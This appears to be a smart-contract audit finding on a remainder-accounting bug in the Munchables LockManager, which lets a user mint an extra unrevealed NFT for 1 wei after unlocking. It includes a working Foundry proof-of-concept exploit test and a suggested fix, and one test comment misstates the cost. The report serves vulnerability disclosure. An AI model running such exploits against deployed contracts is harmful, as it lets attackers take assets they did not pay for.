# Vulnerability details

## Details
When locking tokens to receive unrevealed NFTs using `LockManager::lock`, the remainder is [calculated and assigned to `LockedToken.remainder`](https://github.com/code-423n4/2024-05-munchables/blob/main/src/managers/LockManager.sol#L344-L379).

A closer inspection of the code shows us that `_quantity` includes the `remainder` (i.e., the `remainder` is not deducted from `_quantity`). [This `_quantity` is eventually added to `lockedToken.quantity`](https://github.com/code-423n4/2024-05-munchables/blob/main/src/managers/LockManager.sol#L380). 

Consequently, when unlocking tokens, users will receive all their deposited tokens along with any remainders. Given this, we would expect `lockedToken.remainder` to be set to `0` if a user unlocks all their tokens(since `lockedToken.quantity` contains full amount along with `remainder`). However, the remainder is not decremented [in the `LockManager::unlock` function](https://github.com/code-423n4/2024-05-munchables/blob/main/src/managers/LockManager.sol#L401-L427).

This oversight creates a vulnerability where a user can use this `remainder` to receive an additional NFT with little to no cost(1 wei minimum). By calculating `_quantity` using the following formula (where x is the number of NFTs to receive):

       `_quantity = x * nftCost + (nftCost - 1)`

and calling `LockManager::lock(tokenToLock, _quantity)`, [`lockedToken.remainder` will be set to `nftCost - 1`](https://github.com/code-423n4/2024-05-munchables/blob/main/src/managers/LockManager.sol#L363) and [`lockedToken.quantity` will equal `x * nftCost + (nftCost - 1)`](https://github.com/code-423n4/2024-05-munchables/blob/main/src/managers/LockManager.sol#L380). After the lock period, by unlocking all tokens using `LockManager::unlock(tokenToLock, _quantity)`, the [user receives `(x * nftCost + (nftCost - 1))`](https://github.com/code-423n4/2024-05-munchables/blob/main/src/managers/LockManager.sol#L416-L424)(full amount). However, since `lockedToken.remainder` remains at `(nftCost - 1)`, the user can receive an additional unrevealed NFT by simply locking 1 unit of tokens. [This is because the `lockedToken.remainder is factored in along with `_quantity`](https://github.com/code-423n4/2024-05-munchables/blob/main/src/managers/LockManager.sol#L344).

Let's illustrate this with an example:
- Alice deposits `100 ether + (1 ether - 1 wei)` to receive `100 NFTs` (assuming `nftCost = 1 ether`). `LockManager Balance: 100 ether + (1 ether - 1)`
- After the unlock period, Alice unlocks her tokens and receives `100 ether + (1 ether - 1 wei)`, with the remainder still set to `1 ether - 1 wei`. `LockManager Balance: 0`
- In the current lockDrop event, or a future one, Alice can deposit just `1 wei` and receive an additional unrevealed NFT (assuming the `nftCost` remains unchanged). This works because `_quantity (1 wei) + remainder (1 ether - 1 wei) == 1 ether == nftCost`. `LockManager Balance: 1 wei`

## Impact
- a user can receive one additional unrevealed NFT with discount.

## Proof of Concept
To run this POC:
1- create a file named `LockManager.t.sol` in `/src/test/` folder.
2- add a costume view function to both `/src/managers/LockManager.sol` and `/src/interfaces/ILockManager.sol`. this function is used to fetch `remainder` of a user:

    function getRemainder(
        address _player,
        address _token
    ) public view returns (uint) {
        return lockedTokens[_player][_token].remainder;
    }

copy and paste this code into `LockManager.t.sol` and run `forge test --match-test  test_poc_mintAdditionalNFT`:

    // SPDX-License-Identifier: UNLICENSED
    pragma solidity ^0.8.25;
    
    import {Test} from "forge-std/Test.sol";
    import {console} from "forge-std/console.sol";
    import {LockManager} from "../../src/managers/LockManager.sol";
    import "./MunchablesTest.sol";
    
    contract LockManagerTest is MunchablesTest {
        function test_poc_mintAdditionalNFT() public {
            uint256 lockAmount = 100 ether + (1 ether - 1);
    
            console.log("Beginning run()");
            deployContracts();
    
            //note register me
            amp.register(MunchablesCommonLib.Realm(3), address(0));
            logSnuggery("Initial snuggery");
    
            //note lock tokens (100 ETH + (1 ETH - 1))
            lm.lock{value: lockAmount}(address(0), lockAmount);
    
            //note NFT price is 1 ETH per NFT, so we expect to receive 100 unrevealed NFTs
            assertEq(nfto.getUnrevealedNFTs(address(this)), 100);
    
            //note lock time passed (minLockDuration)
            vm.warp(block.timestamp + 86400);
    
            //note unlock
            uint balnace_usdb_before = address(this).balance;
            lm.unlock(address(0), lockAmount);
            uint balnace_usdb_after = address(this).balance;
    
            //note received 100 ETH, but still has 1 ETH - 1 as remainder
            assertEq(balnace_usdb_after - balnace_usdb_before, lockAmount);
            assertEq(lm.getRemainder(address(this), address(0)), 1 ether - 1);
    
            //note mints one additional NFT with 0.5 ether instead of 1
            lm.lock{value: 1}(address(0), 1);
    
            //note received one additional NFT
            assertEq(nfto.getUnrevealedNFTs(address(this)), 101);
        }
    }

## Recommended Mitigation Steps:
to resolve this issue, i would suggest checking whether `remainder` is less than `quantity`. if so, we would assign `remainder` to `quantity`:

    function unlock(
        address _tokenContract,
        uint256 _quantity
    ) external notPaused nonReentrant {
        LockedToken storage lockedToken = lockedTokens[msg.sender][
            _tokenContract
        ];
        if (lockedToken.quantity < _quantity)
            revert InsufficientLockAmountError();
        if (lockedToken.unlockTime > uint32(block.timestamp))
            revert TokenStillLockedError();

        // force harvest to make sure that they get the schnibbles that they are entitled to
        accountManager.forceHarvest(msg.sender);

        lockedToken.quantity -= _quantity; 

        //@audit-info taking into account the remainder
        if (lockedToken.quantity < lockedToken.remainder) {
            lockedToken.remainder = lockedToken.quantity;
        }

        if (_tokenContract == address(0)) {
            payable(msg.sender).transfer(_quantity);
        } else {
            IERC20 token = IERC20(_tokenContract);
            token.transfer(msg.sender, _quantity);
        }

        emit Unlocked(msg.sender, _tokenContract, _quantity);
    }

doing this, if user unlocked amount also included `remainder`, the `lockedToken.remainder` will be assigned to `lockedToken.quantitiy`
